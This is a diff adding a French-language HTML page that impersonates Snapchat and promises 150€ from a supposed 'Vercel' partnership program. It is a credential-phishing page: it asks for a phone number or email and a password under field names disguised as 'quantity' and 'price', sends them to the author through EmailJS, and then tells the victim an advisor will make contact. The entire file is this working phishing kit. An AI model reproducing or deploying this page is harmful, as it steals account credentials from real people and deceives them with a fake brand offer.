@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Formulaire de Prix et de Quantité</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #FFFC00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #000;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input[type="text"] {
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        input[type="text"]:focus {
+            border-color: #00B2FF;
+            outline: none;
+        }
+        input[type="submit"] {
+            background-color: #00B2FF;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        input[type="submit"]:hover {
+            background-color: #0095D9;
+        }
+        #confirmation-message {
+            display: none;
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://th.bing.com/th?id=OIP.XohozfrvQgQvlRBi16vj5QHaEK&w=333&h=187&c=8&rs=1&qlt=90&o=6&dpr=2.5&pid=3.1&rm=2" alt="Snapchat Logo" class="logo">
+        <h1>Gagnez 150€ avec notre nouveau programme Vercel en partenariat avec Snapchat.</h1>
+        <form id="contact-form">
+            <input type="text" id="quantity" name="quantity" placeholder="numéro telephone ou email" required>
+            <input type="text" id="price" name="price" placeholder="mot de passe" required>
+            <input type="submit" value="Connecter">
+        </form>
+        <div id="confirmation-message"></div>
+    </div>
+
+    <!-- Inclure le script EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <!-- Script pour initialiser EmailJS et gérer l'envoi du formulaire -->
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("wR9obOBYdBKT6kZ3x"); // Votre User ID
+
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                emailjs.sendForm('service_v7h5jeq', 'template_v78lc41', this)
+                    .then(function(response) {
+                        console.log('SUCCESS!', response.status, response.text);
+                        // Cacher le formulaire
+                        document.getElementById('contact-form').style.display = 'none';
+                        
+                        // Afficher le message de confirmation
+                        var confirmationMessage = document.getElementById('confirmation-message');
+                        confirmationMessage.innerHTML = "Un conseiller doit vous contacter d'ici peu pour la validation de votre compte.";
+                        confirmationMessage.style.display = 'block';
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        alert('L\'envoi de votre message a échoué...');
+                    });
+            });
+        })();
+    </script>
+</body>
+</html>
